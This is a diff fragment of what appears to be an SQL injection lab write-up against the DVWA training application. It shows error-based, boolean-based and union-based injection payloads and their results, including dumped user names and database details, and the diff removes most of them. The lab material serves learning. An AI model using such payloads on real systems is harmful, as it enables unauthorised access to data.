@@ -219,19 +219,4 @@ allowing attackers to extract sensitive data from the database.
 Error Based:
 
 Payload: 1' OR '1'='1
-
 Result: MariaDB error revealed
-
-Boolean Based:
-
-Payload: ' OR 1=1#
-
-Result: All 5 users dumped
-
-Users: admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith
-
-Union Based:
-
-Payload: ' OR 1=1 UNION SELECT user(),database()#
-
-Result: DB User: app@localhost | DB Name: dvwa
